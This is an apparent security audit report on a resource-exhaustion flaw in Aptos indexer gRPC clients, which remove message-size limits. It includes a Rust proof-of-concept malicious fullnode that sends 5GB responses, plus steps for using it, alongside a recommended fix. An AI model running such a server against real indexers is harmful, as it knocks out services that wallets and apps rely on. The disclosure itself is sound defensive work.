# Audit Report

## Title
Resource Exhaustion via Unbounded gRPC Message Size in Indexer Client

## Summary
The `create_grpc_client()` and `create_data_service_grpc_client()` functions in the indexer-grpc-utils module configure gRPC clients with `max_decoding_message_size(usize::MAX)`, removing all limits on incoming message sizes. This allows a compromised or malicious fullnode to send arbitrarily large messages (multi-GB) that will be decoded into memory, causing out-of-memory (OOM) crashes on indexer nodes and disrupting blockchain data availability. [1](#0-0) [2](#0-1) 

## Finding Description

The indexer-grpc infrastructure consists of clients that connect to fullnode gRPC servers to stream transaction data. The vulnerable code configures these clients without proper message size limits.

**Vulnerability Location:**

The `create_grpc_client()` function sets: [3](#0-2) 

Similarly, `create_data_service_grpc_client()` sets: [4](#0-3) 

**Attack Vector:**

1. The indexer-grpc-cache-worker uses these clients to connect to a fullnode: [5](#0-4) 

2. The fullnode address is operator-configured: [6](#0-5) 

3. If the fullnode is compromised or the operator is tricked into connecting to a malicious server, the attacker can send `TransactionsFromNodeResponse` messages with massive `TransactionsOutput` payloads.

4. The protobuf definition shows the structure: [7](#0-6) 

5. With `max_decoding_message_size(usize::MAX)`, the gRPC client accepts messages up to 2^64-1 bytes (18 exabytes on 64-bit systems), effectively unlimited.

6. When tonic receives a multi-gigabyte message, it attempts to allocate that memory and decode the entire protobuf message, causing OOM crash.

**Inconsistency Evidence:**

While the vulnerable code uses `usize::MAX`, other parts of the codebase use reasonable limits:

- The server-side chunks messages to 15MB: [8](#0-7) 

- The indexer-grpc-manager uses 256MB limits: [9](#0-8) [10](#0-9) 

- The data-service-v2 also uses 256MB limits: [11](#0-10) [12](#0-11) 

This inconsistency demonstrates that `usize::MAX` is not an intentional design choice but a configuration oversight.

**Broken Invariant:**

This violates **Invariant 9: Resource Limits** - "All operations must respect gas, storage, and computational limits." By setting `usize::MAX`, the code removes all memory consumption limits for message decoding, allowing unbounded resource usage.

## Impact Explanation

**Severity: High** (per Aptos Bug Bounty Program)

According to the Aptos bug bounty criteria, this qualifies as **"API crashes"** which is explicitly listed under **High Severity** (up to $50,000).

**Impact Details:**

1. **Availability Attack**: A single malicious or compromised fullnode can crash all indexer nodes connected to it by sending oversized messages.

2. **Service Disruption**: Indexers are critical infrastructure that provide:
   - Transaction history queries for dApps
   - Account state queries for wallets
   - Event streaming for monitoring tools
   - Historical data for analytics platforms

3. **Cascading Failures**: Multiple indexer instances connecting to the same compromised fullnode will all crash simultaneously, causing widespread service outage.

4. **Recovery Difficulty**: Each OOM crash requires manual restart and investigation, during which the indexer service is unavailable.

5. **Resource Exhaustion**: The attack consumes all available memory on the indexer host, potentially affecting other co-located services.

## Likelihood Explanation

**Likelihood: Medium-High**

**Attack Prerequisites:**
1. Attacker must compromise a fullnode OR convince an operator to connect to a malicious server
2. No authentication or validation of message sizes on the client side
3. No rate limiting or anomaly detection for message sizes

**Realistic Attack Scenarios:**

1. **Fullnode Compromise**: If an attacker gains control of a fullnode through software vulnerabilities, misconfigurations, or supply chain attacks, they can immediately exploit this to crash all connected indexers.

2. **Misconfiguration Attack**: Social engineering or documentation confusion could lead operators to point their indexers at malicious servers during setup or migration.

3. **Man-in-the-Middle**: If TLS is not properly configured or enforced, network-level attackers could inject oversized messages.

**Mitigating Factors:**
- Requires fullnode compromise or operator misconfiguration (not directly exploitable from the network)
- Indexers typically connect to trusted fullnodes operated by the same entity

**Aggravating Factors:**
- Simple to exploit once prerequisites are met (just send large protobuf message)
- No detection or alerting mechanisms in place
- Affects multiple indexer instances simultaneously
- Fullnode compromises are realistic threat scenarios in blockchain infrastructure

## Recommendation

**Immediate Fix:**

Replace `usize::MAX` with a reasonable constant that matches other components in the codebase. Use the same 256MB limit that the indexer-grpc-manager and data-service-v2 components use:

```rust
// In ecosystem/indexer-grpc/indexer-grpc-utils/src/constants.rs
pub const MAX_GRPC_MESSAGE_SIZE: usize = 256 * (1 << 20); // 256 MB

// In ecosystem/indexer-grpc/indexer-grpc-utils/src/lib.rs
use crate::constants::MAX_GRPC_MESSAGE_SIZE;

pub async fn create_grpc_client(address: Url) -> GrpcClientType {
    backoff::future::retry(backoff::ExponentialBackoff::default(), || async {
        match FullnodeDataClient::connect(address.to_string()).await {
            Ok(client) => {
                tracing::info!(
                    address = address.to_string(),
                    "[Indexer Cache] Connected to indexer gRPC server."
                );
                Ok(client
                    .max_decoding_message_size(MAX_GRPC_MESSAGE_SIZE)  // Changed
                    .max_encoding_message_size(MAX_GRPC_MESSAGE_SIZE)  // Changed
                    .send_compressed(CompressionEncoding::Zstd)
                    .accept_compressed(CompressionEncoding::Gzip)
                    .accept_compressed(CompressionEncoding::Zstd))
            },
            // ... error handling
        }
    })
    .await
    .unwrap()
}

pub async fn create_data_service_grpc_client(
    address: Url,
    max_elapsed_time: Option<Duration>,
) -> Result<GrpcDataServiceClientType> {
    // ... backoff setup ...
    let client = backoff::future::retry(backoff, || async {
        match RawDataClient::connect(address.to_string()).await {
            Ok(client) => {
                tracing::info!(
                    address = address.to_string(),
                    "[Indexer Cache] Connected to indexer data service gRPC server."
                );
                Ok(client
                    .max_decoding_message_size(MAX_GRPC_MESSAGE_SIZE)  // Changed
                    .max_encoding_message_size(MAX_GRPC_MESSAGE_SIZE)) // Changed
            },
            // ... error handling
        }
    })
    .await
    .context("Failed to create data service GRPC client")?;
    Ok(client)
}
```

**Additional Hardening Measures:**

1. **Message Size Monitoring**: Add metrics/logging to track actual message sizes received
2. **Anomaly Detection**: Alert when messages approach the size limit
3. **TLS Enforcement**: Ensure all gRPC connections use TLS with certificate validation
4. **Fullnode Authentication**: Implement authentication to verify fullnode identity
5. **Circuit Breaker**: Auto-disconnect and blacklist fullnodes sending oversized messages

## Proof of Concept

**Malicious gRPC Server (Rust):**

```rust
// malicious_fullnode.rs
use aptos_protos::internal::fullnode::v1::{
    fullnode_data_server::{FullnodeData, FullnodeDataServer},
    transactions_from_node_response,
    GetTransactionsFromNodeRequest, PingFullnodeRequest, PingFullnodeResponse,
    StreamStatus, TransactionsFromNodeResponse, TransactionsOutput,
};
use aptos_protos::transaction::v1::Transaction;
use futures::Stream;
use std::pin::Pin;
use tonic::{transport::Server, Request, Response, Status};

pub struct MaliciousFullnode;

#[tonic::async_trait]
impl FullnodeData for MaliciousFullnode {
    type GetTransactionsFromNodeStream = 
        Pin<Box<dyn Stream<Item = Result<TransactionsFromNodeResponse, Status>> + Send>>;

    async fn get_transactions_from_node(
        &self,
        _request: Request<GetTransactionsFromNodeRequest>,
    ) -> Result<Response<Self::GetTransactionsFromNodeStream>, Status> {
        let (tx, rx) = tokio::sync::mpsc::channel(1);
        
        tokio::spawn(async move {
            // Send a 5GB message by creating a massive transaction array
            let huge_transactions = vec![
                Transaction {
                    version: 1,
                    // Fill with large payload data
                    block_metadata: Some(vec![0u8; 1_000_000_000].into()), // 1GB each
                    ..Default::default()
                };
                5 // 5 transactions Ã— 1GB = 5GB total
            ];
            
            let malicious_response = TransactionsFromNodeResponse {
                response: Some(transactions_from_node_response::Response::Data(
                    TransactionsOutput {
                        transactions: huge_transactions,
                    },
                )),
                chain_id: 1,
            };
            
            let _ = tx.send(Ok(malicious_response)).await;
        });
        
        Ok(Response::new(Box::pin(tokio_stream::wrappers::ReceiverStream::new(rx))))
    }

    async fn ping(
        &self,
        _request: Request<PingFullnodeRequest>,
    ) -> Result<Response<PingFullnodeResponse>, Status> {
        Ok(Response::new(PingFullnodeResponse::default()))
    }
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let addr = "127.0.0.1:50051".parse()?;
    let malicious_fullnode = MaliciousFullnode;

    println!("Malicious fullnode server listening on {}", addr);
    println!("Will send 5GB messages to crash indexer clients with usize::MAX limit");

    Server::builder()
        .add_service(FullnodeDataServer::new(malicious_fullnode))
        .serve(addr)
        .await?;

    Ok(())
}
```

**Exploitation Steps:**

1. Deploy malicious fullnode server on attacker-controlled infrastructure
2. Compromise legitimate fullnode OR socially engineer operator to use malicious server address
3. Configure indexer-grpc-cache-worker with malicious `fullnode_grpc_address`
4. Start indexer - it will connect and receive 5GB message
5. Indexer attempts to allocate 5GB+ memory for decoding, causing OOM crash

**Expected Result:** Indexer process crashes with out-of-memory error, service becomes unavailable.

**With Fix:** Client rejects message with "Message too large" error, maintains availability.

## Notes

This vulnerability is **not** a consensus or validator issue - it affects only the indexer infrastructure layer. However, indexers are critical for ecosystem health as they provide the primary data access layer for applications, wallets, and explorers. Widespread indexer unavailability would severely impact user experience even though the blockchain itself continues operating normally.

The fix is straightforward and aligns with existing patterns in the codebase where reasonable message size limits (256MB) are already enforced in other gRPC components.

### Citations

**File:** ecosystem/indexer-grpc/indexer-grpc-utils/src/lib.rs (L36-63)
```rust
pub async fn create_grpc_client(address: Url) -> GrpcClientType {
    backoff::future::retry(backoff::ExponentialBackoff::default(), || async {
        match FullnodeDataClient::connect(address.to_string()).await {
            Ok(client) => {
                tracing::info!(
                    address = address.to_string(),
                    "[Indexer Cache] Connected to indexer gRPC server."
                );
                Ok(client
                    .max_decoding_message_size(usize::MAX)
                    .max_encoding_message_size(usize::MAX)
                    .send_compressed(CompressionEncoding::Zstd)
                    .accept_compressed(CompressionEncoding::Gzip)
                    .accept_compressed(CompressionEncoding::Zstd))
            },
            Err(e) => {
                tracing::error!(
                    address = address.to_string(),
                    "[Indexer Cache] Failed to connect to indexer gRPC server: {}",
                    e
                );
                Err(backoff::Error::transient(e))
            },
        }
    })
    .await
    .unwrap()
}
```

**File:** ecosystem/indexer-grpc/indexer-grpc-utils/src/lib.rs (L69-101)
```rust
pub async fn create_data_service_grpc_client(
    address: Url,
    max_elapsed_time: Option<Duration>,
) -> Result<GrpcDataServiceClientType> {
    let mut backoff = backoff::ExponentialBackoff::default();
    if let Some(max_elapsed_time) = max_elapsed_time {
        backoff.max_elapsed_time = Some(max_elapsed_time);
    }
    let client = backoff::future::retry(backoff, || async {
        match RawDataClient::connect(address.to_string()).await {
            Ok(client) => {
                tracing::info!(
                    address = address.to_string(),
                    "[Indexer Cache] Connected to indexer data service gRPC server."
                );
                Ok(client
                    .max_decoding_message_size(usize::MAX)
                    .max_encoding_message_size(usize::MAX))
            },
            Err(e) => {
                tracing::error!(
                    address = address.to_string(),
                    "[Indexer Cache] Failed to connect to indexer data service gRPC server: {}",
                    e
                );
                Err(backoff::Error::transient(e))
            },
        }
    })
    .await
    .context("Failed to create data service GRPC client")?;
    Ok(client)
}
```

**File:** ecosystem/indexer-grpc/indexer-grpc-cache-worker/src/worker.rs (L117-117)
```rust
            let mut rpc_client = create_grpc_client(self.fullnode_grpc_address.clone()).await;
```

**File:** ecosystem/indexer-grpc/indexer-grpc-cache-worker/src/lib.rs (L16-17)
```rust
pub struct IndexerGrpcCacheWorkerConfig {
    pub fullnode_grpc_address: Url,
```

**File:** protos/proto/aptos/internal/fullnode/v1/fullnode_data.proto (L18-20)
```text
message TransactionsOutput {
  repeated aptos.transaction.v1.Transaction transactions = 1;
}
```

**File:** ecosystem/indexer-grpc/indexer-grpc-utils/src/constants.rs (L18-19)
```rust
// Limit the message size to 15MB. By default the downstream can receive up to 15MB.
pub const MESSAGE_SIZE_LIMIT: usize = 1024 * 1024 * 15;
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/config.rs (L15-15)
```rust
pub(crate) const MAX_MESSAGE_SIZE: usize = 256 * (1 << 20);
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L74-75)
```rust
            .max_encoding_message_size(MAX_MESSAGE_SIZE)
            .max_decoding_message_size(MAX_MESSAGE_SIZE);
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/config.rs (L31-31)
```rust
pub(crate) const MAX_MESSAGE_SIZE: usize = 256 * (1 << 20);
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/config.rs (L240-241)
```rust
                .max_decoding_message_size(MAX_MESSAGE_SIZE)
                .max_encoding_message_size(MAX_MESSAGE_SIZE);
```
